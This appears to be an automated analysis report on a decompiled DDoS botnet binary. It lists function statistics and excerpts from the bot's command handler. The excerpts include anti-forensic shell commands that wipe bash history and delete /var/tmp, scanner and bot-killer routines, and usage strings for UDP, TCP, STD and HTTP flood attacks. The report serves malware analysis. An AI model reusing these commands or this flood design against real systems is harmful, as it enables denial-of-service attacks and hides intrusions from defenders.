        szprintf((int32_t)&v213, (int32_t)"1103.170.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"1103.171.%d.%d", (int32_t)v210);

        szprintf(v214, (int32_t)"1103.162.%d.%d", (int32_t)v210);

        szprintf(v214, (int32_t)"177.26.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.177.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.28.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.29.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.30.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.31.%d.%d", (int32_t)v210);

        szprintf(v215, (int32_t)"203.191.%d.%d", (int32_t)v210);

    inet_addr((int32_t)"8.8.8.8");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
            __libc_system(v212);

            __libc_system(v212);

    __libc_system((int32_t)"history -c;history -w");

    __libc_system((int32_t)"cd /root;rm -rf .bash_history");

    return __libc_system((int32_t)"cd /var/tmp; rm -f *");

int32_t __libc_system(int32_t a1) {

================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |2   |3609    |340           |528         |
----------------------------------------------------------------------------------------------
GetRandomPublicIP                                 |1   |1462    |214           |0           |
----------------------------------------------------------------------------------------------
main                                              |0   |850     |87            |483         |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |6   |1088    |70            |175         |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |6   |977     |65            |627         |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |4   |3983    |55            |3683        |
----------------------------------------------------------------------------------------------
fdpopen                                           |2   |525     |38            |0           |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |468     |33            |130         |
----------------------------------------------------------------------------------------------
prints                                            |4   |648     |30            |33          |
----------------------------------------------------------------------------------------------
sendUDP                                           |7   |423     |26            |97          |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |9   |672     |25            |271         |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |2   |1062    |19            |822         |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |357     |17            |107         |
----------------------------------------------------------------------------------------------
sleep                                             |1   |518     |14            |0           |
----------------------------------------------------------------------------------------------
__open_nameservers                                |0   |437     |13            |198         |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |2   |797     |13            |0           |
----------------------------------------------------------------------------------------------
_init                                             |0   |361     |12            |0           |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |2   |412     |11            |157         |
----------------------------------------------------------------------------------------------
print                                             |3   |552     |11            |315         |
----------------------------------------------------------------------------------------------
__heap_free                                       |3   |345     |10            |12          |
----------------------------------------------------------------------------------------------
inet_pton                                         |3   |618     |9             |269         |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |590     |9             |216         |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |6   |391     |9             |18          |
----------------------------------------------------------------------------------------------
getBogos                                          |1   |281     |9             |64          |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |280     |8             |50          |
----------------------------------------------------------------------------------------------
printi                                            |7   |325     |8             |18          |
----------------------------------------------------------------------------------------------
recvLine                                          |4   |349     |7             |105         |
----------------------------------------------------------------------------------------------
negotiate                                         |4   |266     |7             |0           |
----------------------------------------------------------------------------------------------
sendSTD                                           |3   |250     |7             |23          |
----------------------------------------------------------------------------------------------
fdpclose                                          |1   |265     |6             |23          |
----------------------------------------------------------------------------------------------
getCores                                          |0   |237     |6             |19          |
----------------------------------------------------------------------------------------------
srandom_r                                         |0   |302     |5             |41          |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |2   |337     |5             |62          |
----------------------------------------------------------------------------------------------
readUntil                                         |7   |325     |5             |99          |
----------------------------------------------------------------------------------------------
strstr                                            |3   |349     |5             |115         |
----------------------------------------------------------------------------------------------
getcwd                                            |2   |383     |4             |0           |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |3   |337     |4             |89          |
----------------------------------------------------------------------------------------------
connectTimeout                                    |5   |281     |4             |31          |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |0   |926     |4             |687         |
----------------------------------------------------------------------------------------------
socket_connect                                    |2   |249     |4             |0           |
----------------------------------------------------------------------------------------------
botkiller                                         |1   |234     |3             |18          |
----------------------------------------------------------------------------------------------
ClearHistory                                      |0   |216     |3             |0           |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |251     |3             |0           |
----------------------------------------------------------------------------------------------
realloc                                           |1   |281     |3             |0           |
----------------------------------------------------------------------------------------------
listFork                                          |0   |244     |3             |20          |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |1   |486     |3             |269         |
----------------------------------------------------------------------------------------------
sockprintf                                        |3   |221     |3             |0           |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |322     |3             |82          |
----------------------------------------------------------------------------------------------
strnlen                                           |1   |317     |3             |67          |
----------------------------------------------------------------------------------------------
__GI_fclose                                       |1   |261     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_strncat                                      |4   |307     |3             |62          |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |223     |2             |0           |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |283     |2             |61          |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |247     |2             |17          |
----------------------------------------------------------------------------------------------
__GI_strlen                                       |0   |298     |2             |24          |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |323     |2             |27          |
----------------------------------------------------------------------------------------------
abort                                             |1   |332     |2             |0           |
----------------------------------------------------------------------------------------------
memrchr                                           |4   |337     |2             |84          |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |2   |311     |2             |85          |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |3   |314     |2             |69          |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |2   |251     |2             |30          |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |5   |331     |2             |52          |
----------------------------------------------------------------------------------------------
__libc_system                                     |1   |256     |2             |0           |
----------------------------------------------------------------------------------------------
execl                                             |5   |283     |2             |53          |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |244     |2             |0           |
----------------------------------------------------------------------------------------------
trim                                              |1   |276     |2             |60          |
----------------------------------------------------------------------------------------------
_stdio_term                                       |2   |265     |2             |30          |
----------------------------------------------------------------------------------------------
inet_aton                                         |1   |302     |2             |73          |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |0   |278     |2             |28          |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |237     |2             |17          |
----------------------------------------------------------------------------------------------
strcasestr                                        |3   |244     |1             |28          |
----------------------------------------------------------------------------------------------
GetRandomIP                                       |1   |215     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_creat                                      |1   |214     |1             |0           |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |2   |228     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |0   |319     |1             |37          |
----------------------------------------------------------------------------------------------
getsockopt                                        |5   |213     |1             |0           |
----------------------------------------------------------------------------------------------
random                                            |0   |219     |1             |0           |
----------------------------------------------------------------------------------------------
zprintf                                           |2   |214     |1             |0           |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |221     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa_r                                  |2   |236     |1             |20          |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |1   |249     |1             |26          |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |213     |1             |0           |
----------------------------------------------------------------------------------------------
malloc                                            |0   |297     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |216     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_connect                                    |3   |213     |1             |0           |
----------------------------------------------------------------------------------------------
srand                                             |1   |217     |1             |0           |
----------------------------------------------------------------------------------------------
sclose                                            |1   |221     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_vsnprintf                                    |0   |228     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |1   |261     |1             |35          |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |214     |1             |0           |
----------------------------------------------------------------------------------------------
rawmemchr                                         |3   |297     |1             |10          |
----------------------------------------------------------------------------------------------
__GI_fopen                                        |2   |214     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |4   |213     |1             |0           |
----------------------------------------------------------------------------------------------
free                                              |0   |268     |1             |0           |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |265     |1             |44          |
----------------------------------------------------------------------------------------------
socket                                            |3   |213     |1             |0           |
----------------------------------------------------------------------------------------------
__GI__exit                                        |1   |224     |1             |9           |
----------------------------------------------------------------------------------------------
fdgets                                            |3   |239     |1             |21          |
----------------------------------------------------------------------------------------------
advance_state                                     |2   |221     |1             |0           |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |2   |214     |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |3   |215     |1             |0           |
----------------------------------------------------------------------------------------------
__raise                                           |1   |214     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |0   |402     |1             |115         |
----------------------------------------------------------------------------------------------
__GI_strcasecmp                                   |2   |254     |1             |36          |
----------------------------------------------------------------------------------------------
__heap_alloc                                      |2   |279     |1             |46          |
----------------------------------------------------------------------------------------------
getdtablesize                                     |1   |221     |1             |0           |
----------------------------------------------------------------------------------------------
fgets                                             |3   |229     |1             |0           |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |6   |216     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |2   |214     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |2   |283     |1             |61          |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |7   |213     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |213     |1             |0           |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |0   |305     |1             |4           |
----------------------------------------------------------------------------------------------
rand                                              |0   |214     |1             |0           |
----------------------------------------------------------------------------------------------
memcpy                                            |0   |405     |1             |91          |
----------------------------------------------------------------------------------------------
isatty                                            |1   |215     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |2   |236     |1             |17          |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |225     |1             |0           |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |1   |295     |1             |52          |
----------------------------------------------------------------------------------------------
parseHex                                          |1   |241     |1             |18          |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |2   |312     |1             |66          |
----------------------------------------------------------------------------------------------
_charpad                                          |3   |240     |1             |17          |
----------------------------------------------------------------------------------------------
__heap_alloc_at                                   |3   |267     |1             |45          |
----------------------------------------------------------------------------------------------
ioctl                                             |3   |289     |1             |0           |
----------------------------------------------------------------------------------------------
sprintf                                           |8   |216     |1             |0           |
----------------------------------------------------------------------------------------------
__length_dotted                                   |0   |241     |1             |17          |
----------------------------------------------------------------------------------------------
__libc_recv                                       |4   |213     |1             |0           |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |216     |1             |0           |
----------------------------------------------------------------------------------------------
szprintf                                          |3   |214     |1             |0           |
----------------------------------------------------------------------------------------------
tcpcsum                                           |3   |219     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |3   |293     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_answer                                   |4   |245     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area                             |4   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_init                                |1   |227     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |2   |215     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |0   |214     |0             |0           |
----------------------------------------------------------------------------------------------
csum                                              |5   |365     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fork                                       |0   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |226     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_open                                       |2   |231     |0             |0           |
----------------------------------------------------------------------------------------------
wait4                                             |1   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |1   |230     |0             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |1   |224     |0             |0           |
----------------------------------------------------------------------------------------------
getuid                                            |1   |224     |0             |0           |
----------------------------------------------------------------------------------------------
call___do_global_dtors_aux                        |0   |215     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |249     |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |0   |233     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |2   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |2   |498     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fcntl64                                      |1   |227     |0             |0           |
----------------------------------------------------------------------------------------------
contains_response                                 |1   |220     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs                                        |2   |229     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_void                             |0   |215     |0             |0           |
----------------------------------------------------------------------------------------------
call___do_global_ctors_aux                        |0   |215     |0             |0           |
----------------------------------------------------------------------------------------------
usleep                                            |2   |214     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |3   |231     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_close                                      |1   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |0   |219     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |3   |224     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |2   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_write                                      |2   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__errno_location                                  |0   |214     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |2   |224     |0             |0           |
----------------------------------------------------------------------------------------------
ntohl                                             |2   |215     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |0   |224     |0             |0           |
----------------------------------------------------------------------------------------------
frame_dummy                                       |0   |219     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |2   |214     |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |6   |224     |0             |0           |
----------------------------------------------------------------------------------------------
htonl                                             |1   |215     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___glibc_strerror_r                           |3   |216     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |2   |217     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |1   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |0   |214     |0             |0           |
----------------------------------------------------------------------------------------------
_start                                            |2   |220     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tolower                                      |1   |217     |0             |0           |
----------------------------------------------------------------------------------------------
_load_inttype                                     |2   |256     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_poll                                       |3   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_lseek64                                    |4   |231     |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |218     |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |3   |278     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |1   |216     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigprocmask                                  |3   |249     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |2   |285     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |226     |0             |0           |
----------------------------------------------------------------------------------------------
reset_telstate                                    |2   |214     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |0   |227     |0             |0           |
----------------------------------------------------------------------------------------------
getBuild                                          |1   |214     |0             |0           |
----------------------------------------------------------------------------------------------
strcat                                            |2   |234     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |240     |0             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |0   |217     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |2   |217     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |0   |214     |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |1   |225     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |2   |214     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |215     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_getpid                                     |0   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_read                                       |1   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |3   |214     |0             |0           |
----------------------------------------------------------------------------------------------
htons                                             |1   |215     |0             |0           |
----------------------------------------------------------------------------------------------
__socketcall                                      |2   |224     |0             |0           |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |3   |225     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |231     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |0   |215     |0             |0           |
----------------------------------------------------------------------------------------------
kill                                              |2   |224     |0             |0           |
----------------------------------------------------------------------------------------------
_fini                                             |0   |214     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |3   |250     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |2   |224     |0             |0           |
----------------------------------------------------------------------------------------------
memmove                                           |2   |477     |0             |0           |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |227     |0             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area_after                       |4   |220     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |0   |216     |0             |0           |
----------------------------------------------------------------------------------------------
_promoted_size                                    |1   |224     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |218     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |266     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_exit                                         |0   |223     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |1   |229     |0             |0           |
----------------------------------------------------------------------------------------------
__bsd_signal                                      |2   |277     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcsetattr                                    |0   |343     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |2   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_mempcpy                                      |7   |215     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |2   |224     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |274     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_ctors_aux                             |1   |230     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |215     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |1   |381     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |1   |214     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |3   |294     |0             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |2   |224     |0             |0           |
----------------------------------------------------------------------------------------------
read_until_response                               |6   |222     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |1   |214     |0             |0           |
----------------------------------------------------------------------------------------------
unknown_0                                         |2   |0       |0             |0           |
----------------------------------------------------------------------------------------------
call_frame_dummy                                  |0   |215     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |214     |0             |0           |
----------------------------------------------------------------------------------------------
__sigismember                                     |2   |216     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |1   |218     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |267     |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |2   |224     |0             |0           |
----------------------------------------------------------------------------------------------
_store_inttype                                    |1   |236     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |3   |226     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |1   |215     |0             |0           |
----------------------------------------------------------------------------------------------
ntohs                                             |0   |215     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |233     |0             |0           |
----------------------------------------------------------------------------------------------
bcopy                                             |4   |214     |0             |0           |
----------------------------------------------------------------------------------------------
__length_question                                 |2   |223     |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |218     |0             |0           |
----------------------------------------------------------------------------------------------
feof                                              |1   |238     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |1   |238     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |3   |229     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |3   |372     |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |246     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |2   |234     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |2   |357     |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 16796
++++++++ FUNCTION END 20405
++++++++ FUNCTION LENGTH 3609
    if (__GI_strcoll((char *)*a2, (int32_t)"PING") == 0) {
        sockprintf(v206, (int32_t)"PONG!", 0x10010000);
            sockprintf(v206, (int32_t)"%d", getdtablesize(0x10030000));
                    kill(v280, 9);
                    sockprintf(v206, (int32_t)"STOPPING SCANNER", 0x10010000);
                        int32_t v281 = __libc_fork(); // 0x1000a17c
                            int32_t v282 = __GI_inet_ntoa(&v213, 0x10030000); // 0x1000a1e0
                            sockprintf(v212, (int32_t)"STARTING SCANNER ON -> %s", v282);
                                if (listFork() == 0) {
                                    v272 = __GI_inet_ntoa(&v213, 0x10030000);
                                    v277 = sockprintf(v212, (int32_t)"COMMENCING BOT KILL ON -> %s", v272);
                                    botkiller(v277);
                            if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                                v273 = __GI_inet_ntoa(&v213, 0x10030000);
                                sockprintf(v212, (int32_t)"My Public IP: %s", v273);
                                if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                            return sockprintf(v206, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10010000);
                                                                                if (listFork() == 0) {
                                                                                    sendUDP(v245, v246, v247, v248, v249, v220, v219);
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                    result = sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                                                    result = sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendTCP(v257, v258, v259, v260, v261, v217, v218);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendTCP(v215, v258, v259, v260, v261, v217, v218);
                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") != 0) {
                                                                                                                                            v286 = listFork();
                                                                                                                                                sendSTD(v269, v270, v271);
                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                    while (true) {
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                            while (true) {
                                                                                                                            result2 = sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                while (true) {
                                                                                                                        int32_t result3 = listFork(); // 0x1000aabc
                                                                                                                        sendHTTP(*v236, v211, (int16_t)(v265 % 0x10000), v210, v209, v268);
                                                                                                                                            v286 = listFork();
                                                                                                                                                sendSTD(v269, v270, v271);
                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                    while (true) {
                                                                                                                                                                    sockprintf(v206, (int32_t)"None Killed.", 0x10010000);
                                                                                                                                                                    sockprintf(v206, (int32_t)"Killed %d.", v284);
                                                                                                                                                            if (*v290 != __libc_getpid()) {
                                                                                                                                                                kill(v292, 9);
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                    sendSTD(v214, v270, v271);
                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                while (true) {
                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                            while (true) {
                                                                                                                            result2 = sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                while (true) {
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendHTTP(*v236, v211, (int16_t)v294, v210, v209, atol(v295, v239));
                                                                                                                                            v286 = listFork();
                                                                                                                                                sendSTD(v269, v270, v271);
                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                    while (true) {
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                            while (true) {
                                                                                                                            result2 = sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                while (true) {
                                                                                                                                        v286 = listFork();
                                                                                                                                            sendSTD(v269, v270, v271);
                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                while (true) {
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                        while (true) {
                                                                                                                        result2 = sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                            while (true) {
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendHTTP(*v236, v211, (int16_t)(v265 % 0x10000), v210, v209, v268);
                                                                                                                                            v286 = listFork();
                                                                                                                                                sendSTD(v269, v270, v271);
                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                    while (true) {
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                            while (true) {
                                                                                                                            result2 = sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                while (true) {
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendSTD(v269, v270, v271);
                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                            while (true) {
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                    while (true) {
                                                                                                                    sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                        while (true) {
                                                                                                                                if (listFork() == 0) {
                                                                                                                                    sendSTD(v269, v270, v271);
                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                        while (true) {
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() == 0) {
                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                while (true) {
                                                                                                                sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                    while (true) {
                                                                                        sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
